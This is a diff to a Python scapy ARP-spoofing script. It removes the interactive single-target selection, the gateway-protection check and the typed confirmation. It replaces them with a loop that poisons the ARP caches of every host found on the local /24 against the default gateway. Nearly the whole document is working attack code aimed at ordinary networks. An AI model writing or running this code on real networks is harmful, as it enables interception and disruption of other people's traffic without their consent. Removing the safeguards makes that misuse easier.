@@ -7,6 +7,29 @@ import sys
 import re
 
 
+def get_default_gateway():
+
+    try:
+        out = subprocess.check_output(["route", "print"], text=True, errors="ignore")
+        m = re.search(r'^\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)\s+', out, re.MULTILINE)
+        if m:
+            return m.group(1)
+    except Exception:
+        pass
+
+    try:
+        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")
+
+        matches = re.findall(r'Default Gateway[ .:]*([\d\.]+)', out)
+        for g in matches:
+            if g and not g.startswith('0.0.0.0'):
+                return g
+    except Exception:
+        pass
+    return None
+
+ip_gateway = get_default_gateway()
+
 def Ascan(ip_range):
     arp_request = scapy.ARP(pdst=ip_range)
 
@@ -18,8 +41,9 @@ def Ascan(ip_range):
 
     clients_list = []
     for element in answered_list:
-        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-        clients_list.append(client_dict)
+        client_dict = {"ip": element[1].psrc}
+        if client_dict["ip"] != ip_gateway:
+            clients_list.append(client_dict)
     
     return clients_list
 
@@ -78,29 +102,7 @@ def restore(destination_ip, source_ip):
 	ether = scapy.Ether(dst=destination_mac)
 	packet = ether/arp
 	scapy.sendp(packet, count=5, verbose=False)
-
-
-def get_default_gateway():
-
-    try:
-        out = subprocess.check_output(["route", "print"], text=True, errors="ignore")
-        m = re.search(r'^\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)\s+', out, re.MULTILINE)
-        if m:
-            return m.group(1)
-    except Exception:
-        pass
-
-    try:
-        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")
-
-        matches = re.findall(r'Default Gateway[ .:]*([\d\.]+)', out)
-        for g in matches:
-            if g and not g.startswith('0.0.0.0'):
-                return g
-    except Exception:
-        pass
-    return None
-
+     
 
 interval = 4
 ip_gateway = get_default_gateway()
@@ -122,46 +124,17 @@ else:
         ip_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
     else:
         ip_range = None
-
-print(f"Detected network range: {ip_range} | Default gateway: {ip_gateway}")
-if not ip_range or not ip_gateway:
-	print("Could not determine network range or gateway. Exiting.")
-	sys.exit(1)
-
-print("Scanning the local network for hosts...")
+        
 clients = Ascan(ip_range)
-if not clients:
-	print("No hosts found to target. Exiting.")
-	sys.exit(0)
-
-print("Found hosts:")
-for i, c in enumerate(clients, 1):
-	print(f"{i:3}: {c['ip']:16}  {c['mac']}")
-
-target_ip = input("Enter target IP from the list above (or press Enter to cancel): ").strip()
-if not target_ip:
-	print("No target selected. Exiting.")
-	sys.exit(0)
-
-if not any(c['ip'] == target_ip for c in clients):
-	print("Selected IP not found in the scanned hosts. Exiting.")
-	sys.exit(1)
-
-if target_ip == ip_gateway:
-	print("Target IP is the gateway. Aborting to avoid disrupting the network.")
-	sys.exit(1)
-
-confirm = input(f"Confirm spoofing {target_ip} so it believes the gateway is {ip_gateway}? Type 'yes' to proceed: ")
-if confirm.lower() != 'yes':
-	print("Confirmation not received. Exiting.")
-	sys.exit(0)
 
 try:
-	print(f"Starting ARP spoofing: {target_ip} <-> {ip_gateway} (interval={interval}s)")
-	while True:
-		Gspoof(target_ip, ip_gateway)
-		Gspoof(ip_gateway, target_ip)
-		time.sleep(interval)
+    while True:
+        for target_ip in clients:
+            target_ip = target_ip['ip']
+            print(f"Starting ARP spoofing: {target_ip} <-> {ip_gateway} (interval={interval}s)")
+            Gspoof(target_ip, ip_gateway)
+            Gspoof(ip_gateway, target_ip)
+            time.sleep(interval)
 
 except KeyboardInterrupt:
 	print('\nInterrupted by user. Restoring ARP tables...')
